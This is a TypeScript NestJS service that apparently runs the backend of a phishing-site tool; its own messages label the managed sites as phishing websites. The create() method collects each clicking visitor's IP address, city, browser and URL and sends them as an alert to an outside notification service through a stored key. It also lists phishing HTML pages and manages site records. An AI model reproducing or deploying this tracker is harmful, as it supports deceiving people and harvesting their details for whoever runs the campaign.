import { Injectable } from '@nestjs/common'
import { getManager, Repository, In } from 'typeorm'
import { InjectRepository } from '@nestjs/typeorm'
import { instanceToPlain, plainToInstance } from 'class-transformer'

import { ResultData } from '../../common/utils/result'
import { AppHttpCode } from '../../common/enums/code.enum'
import { CreateFreshDto } from './dto/create-fresh'
import { FreshEntity } from './fresh.entity'
import { FreshKeyEntity } from './key.entity'
import { HttpService } from '@nestjs/axios'
import path from 'path'
import { FreshJsEntity } from './fresh-js.entity'
var fs = require('fs')

@Injectable()
export class FreshService {
  constructor(
    @InjectRepository(FreshEntity)
    private readonly freshRepo: Repository<FreshEntity>,
    @InjectRepository(FreshKeyEntity)
    private readonly freshKeyRepo: Repository<FreshKeyEntity>,
    @InjectRepository(FreshJsEntity)
    private readonly freshJsRepo: Repository<FreshJsEntity>,
    private httpService: HttpService,
  ) {}

  async create(dto: CreateFreshDto): Promise<ResultData> {
    const data = plainToInstance(FreshEntity, dto)
    // console.log('key', await this.getKey()[0])
    const key = (await this.getKey())[0]['key']
    const url = `title=点击&desp=ip：${dto.ip}，城市：${dto.city}，浏览器：${dto.navigator},url：${dto.url}`
    this.httpService.get(`https://sctapi.ftqq.com/${key}.send?` + encodeURI(url)).subscribe((res: any) => {
      console.log(res)
    })
    const freshList = await this.freshRepo.find()
    for (let i = 0; i < freshList.length - 1; i++) {
      if (freshList[i].url == dto.url) {
        return ResultData.ok()
      }
    }
    const fresh = await getManager().transaction(async (transactionalEntityManager) => {
      return await transactionalEntityManager.save<FreshEntity>(data)
    })
    if (!fresh) return ResultData.fail(AppHttpCode.SERVICE_ERROR, '条目新增失败，请稍后重试')
    return ResultData.ok()
  }

  async findAll() {
    const fresh = await this.freshRepo.find()
    return ResultData.ok(fresh)
  }

  async getKey() {
    const list = await this.freshKeyRepo.find()
    return list
  }

  async setKey(key: string) {
    const fresh = await getManager().transaction(async (transactionalEntityManager) => {
      const result = await transactionalEntityManager.update<FreshKeyEntity>(FreshKeyEntity, '1', plainToInstance(FreshKeyEntity, { id: '1', key: key }))
      return result
    })
    if (!fresh) return ResultData.fail(AppHttpCode.SERVICE_ERROR, '当前角色更新失败，请稍后尝试')
    return ResultData.ok()
  }

  async update(dto: CreateFreshDto) {
    const existing = await this.freshRepo.findOne({ id: dto.id })
    if (!existing) return ResultData.fail(AppHttpCode.USER_NOT_FOUND, '钓鱼网站不存在')
    const { affected } = await getManager().transaction(async (transactionalEntityManager) => {
      return await transactionalEntityManager.update<FreshEntity>(FreshEntity, dto.id, dto)
    })
    if (!affected) return ResultData.fail(AppHttpCode.SERVICE_ERROR, '更新失败，请稍后尝试')
    return ResultData.ok()
  }

  async fileDisplay(filePath) {
    //根据文件路径读取文件，返回文件列表
    const fileList = []
    await fs.readdir(filePath, async (err, files) => {
      if (err) {
        console.warn(err)
      } else {
        //遍历读取到的文件列表
        await files.forEach(async (filename) => {
          //获取当前文件的绝对路径
          var filedir = path.join(filePath, filename)
          //根据文件路径获取文件信息，返回一个fs.Stats对象
          await fs.stat(filedir, async (eror, stats) => {
            if (eror) {
              console.warn('获取文件stats失败')
            } else {
              var isFile = await stats.isFile() //是文件
              var isDir = await stats.isDirectory() //是文件夹
              if (isFile && filename.substring(filename.length - 4, filename.length) === 'html' && filename !== 'index.html') {
                console.log(filedir)
                fileList.push(filename)
              }
              if (isDir) {
                await this.fileDisplay(filedir) //递归，如果是文件夹，就继续遍历该文件夹下面的文件
              }
            }
          })
        })
      }
    })
    await new Promise((resolve) => {
      setTimeout(() => {
        resolve('')
      }, 1000)
    })
    return ResultData.ok(fileList)
  }

  async getJs() {}

  async del(id) {
    const existing = await this.freshRepo.findOne(id)
    if (!existing) return ResultData.fail(AppHttpCode.POST_NOT_FOUND, '网站不存在或已被删除')
    const { affected } = await getManager().transaction(async (transactionalEntityManager) => {
      return await transactionalEntityManager.delete<FreshEntity>(FreshEntity, id)
    })
    if (!affected) return ResultData.fail(AppHttpCode.SERVICE_ERROR, '删除网站失败，请稍后尝试')
    return ResultData.ok()
  }
}
